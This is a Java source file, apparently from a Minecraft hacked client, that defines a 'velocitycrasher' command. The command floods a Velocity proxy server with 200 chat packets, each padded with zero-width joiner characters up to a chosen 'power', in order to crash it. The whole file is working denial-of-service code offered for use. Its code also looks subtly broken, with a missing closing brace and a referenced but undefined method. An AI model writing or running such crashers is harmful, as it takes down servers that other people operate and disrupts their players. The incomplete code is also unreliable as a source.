package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.paradise_client.command.Command;
import net.minecraft.text.Text;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.command.CommandSource;

/**
 * Command: Velocity Proxy Crasher
 */
public class VelocityCrasherCommand extends Command {

    public VelocityCrasherCommand() {
        super("velocitycrasher", "Velocity proxy crasher");
    }

    /**
     * Register command arguments
     */
    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        LiteralArgumentBuilder<CommandSource> literal = root.executes(ctx -> executeDefault(ctx));

        RequiredArgumentBuilder<CommandSource, String> serverArg =
                RequiredArgumentBuilder.<CommandSource, String>argument("server", StringArgumentType.word())
                        .executes(ctx -> executeDefault(ctx));

        RequiredArgumentBuilder<CommandSource, Integer> powerArg =
                RequiredArgumentBuilder.<CommandSource, Integer>argument("power", IntegerArgumentType.integer(200))
                        .executes(ctx -> executeAttack(ctx));

        serverArg.then(powerArg);
        literal.then(serverArg);
    }

    /**
     * Executes the exploit logic
     */
    private int executeAttack(CommandContext<CommandSource> ctx) {
    Runnable task = () -> {
        if (this.getMinecraftClient().player == null
                || this.getMinecraftClient().getNetworkHandler() == null) {
            return;
        }

        ClientPlayNetworkHandler net = this.getMinecraftClient().getNetworkHandler();
        String server = ctx.getArgument("server", String.class);
        int power = ctx.getArgument("power", Integer.class);

        String filler = "\u200d"; // Zero-width joiner
        Text message = Text.literal("server " + server + " " + filler.repeat(power));

        for (int i = 0; i < 200; i++) {
            net.sendPacket(new ChatMessageC2SPacket(message));
        }

        try {
            Thread.sleep(50L);
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
        }
    };

    new Thread(task, "VelocityCrasher").start();
    return 1;
}
